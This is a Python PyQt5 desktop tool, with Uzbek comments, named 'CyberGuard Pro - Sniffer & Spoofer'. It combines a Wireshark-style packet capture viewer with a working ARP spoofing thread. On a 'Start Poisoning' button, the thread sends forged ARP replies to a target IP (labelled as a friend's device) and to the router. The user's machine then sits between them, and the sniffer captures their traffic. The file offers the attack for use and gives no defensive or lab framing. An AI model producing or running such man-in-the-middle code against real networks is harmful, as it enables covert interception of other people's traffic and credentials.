import sys
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTableWidget, QTableWidgetItem,
                             QVBoxLayout, QWidget, QHBoxLayout, QLineEdit, QLabel,
                             QSplitter, QHeaderView, QTextEdit, QTreeWidget,
                             QTreeWidgetItem, QPushButton, QMessageBox)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QColor, QFont
from scapy.all import sniff, IP, ARP, send, getmacbyip, conf
import scapy.utils
from scapy.layers.http import HTTP

# Protokol ranglari
PROTO_COLORS = {
    'TCP': QColor("#e7e6ff"),
    'UDP': QColor("#daeeff"),
    'ICMP': QColor("#fce2ff"),
    'HTTP': QColor("#e7ffde"),
    'ARP': QColor("#fff3da"),
    'OTHER': QColor("#ffffff")
}


class ARPSpooferThread(QThread):
    error_signal = pyqtSignal(str)

    def __init__(self, target_ip, gateway_ip):
        super().__init__()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.is_running = False

    def run(self):
        self.is_running = True

        # 1. MAC manzillarni aniqlash (WARNING chiqmasligi uchun shart)
        target_mac = getmacbyip(self.target_ip)
        gateway_mac = getmacbyip(self.gateway_ip)

        if not target_mac or not gateway_mac:
            self.error_signal.emit("Xato: MAC manzillarni aniqlab bo'lmadi! Qurilmalar tarmoqdami?")
            self.is_running = False
            return

        try:
            while self.is_running:
                # Do'stingizga: "Men routerman" (hwdst qo'shildi)
                send(ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                # Routerga: "Men do'stingizman" (hwdst qo'shildi)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=self.target_ip), verbose=False)
                time.sleep(2)
        except Exception as e:
            self.error_signal.emit(f"ARP Spoofing xatosi: {e}")

    def stop(self):
        self.is_running = False


class SnifferThread(QThread):
    new_packet_signal = pyqtSignal(list, object)
    error_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.is_running = False

    def run(self):
        self.is_running = True
        try:
            sniff(prn=self.process_packet,
                  stop_filter=lambda x: not self.is_running,
                  store=False)
        except Exception as e:
            self.error_signal.emit(str(e))

    def process_packet(self, pkt):
        proto = "OTHER"
        src, dst = "N/A", "N/A"

        if pkt.haslayer(IP):
            proto = pkt.sprintf("%IP.proto%").upper()
            src = pkt[IP].src
            dst = pkt[IP].dst
            if pkt.haslayer(HTTP):
                proto = "HTTP"
        elif pkt.haslayer(ARP):
            proto = "ARP"
            src = pkt[ARP].psrc
            dst = pkt[ARP].pdst

        info = [
            "{:.6f}".format(pkt.time),
            src,
            dst,
            proto,
            str(len(pkt)),
            pkt.summary()
        ]
        self.new_packet_signal.emit(info, pkt)

    def stop(self):
        self.is_running = False


class WiresharkPro(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CyberGuard Pro - Sniffer & Spoofer")
        self.resize(1200, 850)
        self.all_packets_data = []
        self.init_ui()

        self.sniffer = SnifferThread()
        self.sniffer.new_packet_signal.connect(self.update_ui)
        self.sniffer.error_signal.connect(self.show_error)
        self.spoofer = None

    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # ARP Panel
        arp_panel = QHBoxLayout()
        self.target_ip_input = QLineEdit()
        self.target_ip_input.setPlaceholderText("Do'stingiz IP")
        self.gateway_ip_input = QLineEdit()
        self.gateway_ip_input.setPlaceholderText("Router IP")
        self.btn_arp = QPushButton("🎯 Start Poisoning")
        self.btn_arp.clicked.connect(self.toggle_arp)
        self.btn_arp.setStyleSheet("background-color: #f0ad4e; font-weight: bold; padding: 5px;")

        arp_panel.addWidget(QLabel("Target:"))
        arp_panel.addWidget(self.target_ip_input)
        arp_panel.addWidget(QLabel("Gateway:"))
        arp_panel.addWidget(self.gateway_ip_input)
        arp_panel.addWidget(self.btn_arp)
        main_layout.addLayout(arp_panel)

        # Control Buttons
        toolbar = QHBoxLayout()
        self.btn_start = QPushButton("▶ Start Sniffing")
        self.btn_start.setStyleSheet("background-color: #28a745; color: white; font-weight: bold;")
        self.btn_start.clicked.connect(self.toggle_sniffing)
        self.btn_stop = QPushButton("⏹ Stop")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.toggle_sniffing)
        toolbar.addWidget(self.btn_start)
        toolbar.addWidget(self.btn_stop)
        main_layout.addLayout(toolbar)

        # Table & Viewers
        self.main_splitter = QSplitter(Qt.Vertical)
        self.table = QTableWidget(0, 7)
        self.table.setHorizontalHeaderLabels(["No.", "Time", "Source", "Destination", "Protocol", "Length", "Info"])
        self.table.horizontalHeader().setStretchLastSection(True)
        self.table.itemClicked.connect(self.display_details)
        self.main_splitter.addWidget(self.table)

        self.bottom_splitter = QSplitter(Qt.Horizontal)
        self.tree = QTreeWidget()
        self.bottom_splitter.addWidget(self.tree)
        self.hex_view = QTextEdit()
        self.hex_view.setFont(QFont("Courier New", 10))
        self.hex_view.setReadOnly(True)
        self.bottom_splitter.addWidget(self.hex_view)

        self.main_splitter.addWidget(self.bottom_splitter)
        main_layout.addWidget(self.main_splitter)

    def toggle_arp(self):
        if self.spoofer is None or not self.spoofer.isRunning():
            t_ip = self.target_ip_input.text().strip()
            g_ip = self.gateway_ip_input.text().strip()
            if not t_ip or not g_ip:
                QMessageBox.warning(self, "Diqqat", "IPlarni kiriting!")
                return
            self.spoofer = ARPSpooferThread(t_ip, g_ip)
            self.spoofer.error_signal.connect(self.show_error)
            self.spoofer.start()
            self.btn_arp.setText("🛑 Stop Poisoning")
            self.btn_arp.setStyleSheet("background-color: #d9534f; color: white;")
        else:
            self.spoofer.stop()
            self.btn_arp.setText("🎯 Start Poisoning")
            self.btn_arp.setStyleSheet("background-color: #f0ad4e;")

    def toggle_sniffing(self):
        if not self.sniffer.isRunning():
            self.table.setRowCount(0)
            self.all_packets_data = []
            self.sniffer.start()
            self.btn_start.setEnabled(False)
            self.btn_stop.setEnabled(True)
        else:
            self.sniffer.stop()
            self.btn_start.setEnabled(True)
            self.btn_stop.setEnabled(False)

    def update_ui(self, info, pkt):
        self.all_packets_data.append((info, pkt))
        row = self.table.rowCount()
        self.table.insertRow(row)
        self.table.setItem(row, 0, QTableWidgetItem(str(len(self.all_packets_data))))
        for i, text in enumerate(info):
            item = QTableWidgetItem(text)
            color = PROTO_COLORS.get(info[3], PROTO_COLORS['OTHER'])
            item.setBackground(color)
            self.table.setItem(row, i + 1, item)
        self.table.scrollToBottom()

    def display_details(self, item):
        try:
            idx = int(self.table.item(item.row(), 0).text()) - 1
            _, pkt = self.all_packets_data[idx]
            self.tree.clear()
            counter = 0
            while pkt.getlayer(counter):
                layer = pkt.getlayer(counter)
                root = QTreeWidgetItem(self.tree, [layer.name])
                for f, v in layer.fields.items():
                    QTreeWidgetItem(root, [f"{f}: {v}"])
                counter += 1
            self.tree.expandAll()
            self.hex_view.setText(scapy.utils.hexdump(pkt, dump=True))
        except:
            pass

    def show_error(self, err):
        QMessageBox.critical(self, "Xato", f"Xatolik: {err}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = WiresharkPro()
    win.show()
    sys.exit(app.exec_())
